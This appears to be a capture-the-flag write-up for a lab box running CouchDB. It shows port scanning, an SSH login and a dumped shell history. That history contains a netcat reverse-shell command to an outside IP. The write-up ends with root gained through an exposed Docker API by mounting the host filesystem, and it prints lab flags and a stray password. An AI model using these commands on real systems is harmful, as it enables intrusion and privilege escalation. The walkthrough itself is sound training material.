## 🔍 1. Initial Reconnaissance

```
rustscan -a 10.49.172.41   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.49.172.41:22
Open 10.49.172.41:5984
[~] Starting Script(s)
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 13:55 -0400
Initiating Ping Scan at 13:55
Scanning 10.49.172.41 [4 ports]
Completed Ping Scan at 13:55, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:55
Completed Parallel DNS resolution of 1 host. at 13:55, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 13:55
Scanning 10.49.172.41 [2 ports]
Discovered open port 22/tcp on 10.49.172.41
Discovered open port 5984/tcp on 10.49.172.41
Completed SYN Stealth Scan at 13:55, 0.10s elapsed (2 total ports)
Nmap scan report for 10.49.172.41
Host is up, received reset ttl 62 (0.080s latency).
Scanned at 2026-06-18 13:55:33 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
5984/tcp open  couchdb syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
           Raw packets sent: 6 (240B) | Rcvd: 18 (728B)


```

![[Screenshot_2026-06-18_14-41-11.png]]
![[Screenshot_2026-06-18_14-40-52.png]]

![[Screenshot_2026-06-18_14-40-26.png]]

```
ssh atena@10.49.172.41                               
The authenticity of host '10.49.172.41 (10.49.172.41)' can't be established.
ED25519 key fingerprint is: SHA256:QXIT4W/vOthS71YtOAr7s67oloxpMmr0GLRVL9iVFJM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.172.41' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
atena@10.49.172.41's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1
atena@ubuntu:~$ ls
user.txt
atena@ubuntu:~$ cat user.txt
THM{1ns3cure_couchdb}
atena@ubuntu:~$ pwd
/home/atena
atena@ubuntu:~$ cd ../../
atena@ubuntu:/$ cd root
-bash: cd: root: Permission denied
atena@ubuntu:/$ sudo -l
[sudo] password for atena: 
Sorry, try again.
[sudo] password for atena: 
Sorry, user atena may not run sudo on ubuntu.
atena@ubuntu:/$ sudo -l
[sudo] password for atena: 
Sorry, user atena may not run sudo on ubuntu.
atena@ubuntu:/$ t4qfzcc4qN##
t4qfzcc4qN##: command not found
atena@ubuntu:/$ sudo -l 
[sudo] password for atena: 
Sorry, user atena may not run sudo on ubuntu.
atena@ubuntu:/$ cd home
atena@ubuntu:/home$ ls
atena
atena@ubuntu:/home$ cd atena
atena@ubuntu:~$ pwd
/home/atena
atena@ubuntu:~$ ls -la
total 48
drwxr-xr-x 6 atena atena 4096 Dec 18  2020 .
drwxr-xr-x 3 root  root  4096 Oct 24  2020 ..
-rw------- 1 atena atena 3171 Dec 18  2020 .bash_history
-rw-r--r-- 1 atena atena  220 Oct 24  2020 .bash_logout
-rw-r--r-- 1 atena atena 3771 Oct 24  2020 .bashrc
drwxr-xr-x 3 root  root  4096 Oct 24  2020 .bundle
drwx------ 2 atena atena 4096 Oct 24  2020 .cache
drwx------ 2 root  root  4096 Oct 24  2020 .gnupg
drwxrwxr-x 2 atena atena 4096 Dec 18  2020 .nano
-rw-r--r-- 1 atena atena  655 Oct 24  2020 .profile
-rw-r--r-- 1 atena atena    0 Oct 24  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 atena atena   22 Dec 18  2020 user.txt
-rw-r--r-- 1 root  root   183 Oct 24  2020 .wget-hsts
atena@ubuntu:~$ cat .bash_history
sudo -s
cd /etc/apt/
rm sources.
rm sources.list
wget https://gist.githubusercontent.com/rohitrawat/60a04e6ebe4a9ec1203eac3a11d4afc1/raw/fcdfde2ab57e455ba9b37077abf85a81c504a4a9/sources.list
apt-get update
apt-get dist-upgrade 
sudo apt-get install software-properties-common
sudo add-apt-repository ppa:couchdb/stable
sudo apt-get update
sudo apt-get install couchdb
sudo chown -R couchdb:couchdb /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
sudo chmod -R 0770 /usr/bin/couchdb /etc/couchdb /usr/share/couchdb
sudo systemctl restart couchdb
curl localhost:5984
apt install curl
curl localhost:5984
nano /etc/couchdb/local.ini
$ sudo systemctl restart couchdb
sudo systemctl restart couchdb
sudo firewall-cmd --zone=public --add-port=5984/tcp --permanent
sudo apt-get install build-essential curl nodejs
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io | bash -s stable --ruby
curl -sSL https://rvm.io/mpapis.asc | sudo gpg --import -
curl -sSL https://rvm.io/pkuczynski.asc | sudo gpg --import -
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
curl -sSL https://get.rvm.io | bash -s stable --ruby
source /usr/local/rvm/scripts/rvm
rvm list known
rvm install 2.2
rvm use 2.2 --default
gem install rails -v 5.0
gem install rails -v 4.1
cd /root/
ls
mkdir railsflag
cd railsflag/
ls
rails new flag
ls
cd flag/
ls
rails -s
nestat -antl
netstat -antl
rails server
gem 'sqlite3'
gem install sqlite3
ls
nano Gemfile
rails server
nano Gemfile
rails server
bundle install
rails server
apt-get remove netcat-openbsd 
apt-get install netcat-traditional 
rails server
nc -e /bin/sh 192.168.85.142 4444
rails server
cd ..
ls
gem unistall rails -v 4.1
gem remove rails -v 4.1
gem uninstall rails
rvm install 2.3
gem unistall rails -v 5.0.1
gem install rails -v 5.0.1
gem install sprockets -v 3.7.2
gem install rails -v 5.0.1
cd ..
rm -r railsflag/
mkdir railflag/
cd railflag/
ls
rails new flag
ls
cd flag/
ls
rails s
rails s -b '0.0.0.0'
nano Gemfile
rails s -b '0.0.0.0'
bundle install
rails s -b '0.0.0.0'
gem unistall rails -v 5.0.1
gem uninstall rails -v 5.0.1
gem uninstall rails
gem install rails -v 5.0.0
ls
rails -s
cd ..
rm -r railflag/
rails new flag
rails
rails -v
ls
cd  flag/
ls
nano Gemfile
rails -s
rails s
gem uninstall rails
cd ..
ls
rm flag/
rm -r flag/
ls
rails _5.0.0_ new flag
gem uninstall rails
rail s
rails s
rails -v
gem uninstall rails
rails -v
apt-get remove rails
gem uninstall rails
rails 
rails -v
gem list rails --local
ls
rm -r flag/
rails _5.0.0_ new flag
cd flag/
cat Gemfile
rails s
rails --version
rails 
apt-get remove rails
reboot
ip addr
apt-get install ssh
sudo apt-get install ssh
ls
gem uninstall rails 
gem
gem unistall rails
rvm
ls
netstat -antl
apt-get remove rails
rails
rails -v
ls
netstat -antl
sudo apt-get install docker
sudo service docker status
sudo reboot
ps aux
ip addr
ls
cd /root
ls
cd flag/
ls
cd ..
rm -r flag/
apt-get remove redis
nano root.txt
exit
sudo deluser USERNAME sudo
sudo deluser atena sudo
exit
sudo -s
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
uname -a
exit
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # pwd
/
/ # ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
/ # cd root
~ # ls
~ # pwd
/root
~ # ls -la
total 12
drwx------    1 root     root          4096 Jun 18 18:31 .
drwxr-xr-x    1 root     root          4096 Jun 18 18:31 ..
-rw-------    1 root     root            29 Jun 18 18:31 .ash_history
~ # cd ..
/ # find -name root.txt
./mnt/root/root.txt
/ # cat ./mnt/root/root.txt
THM{RCE_us1ng_Docker_API}
/ # Connection to 10.49.172.41 closed by remote host.
Connection to 10.49.172.41 closed.
    

```





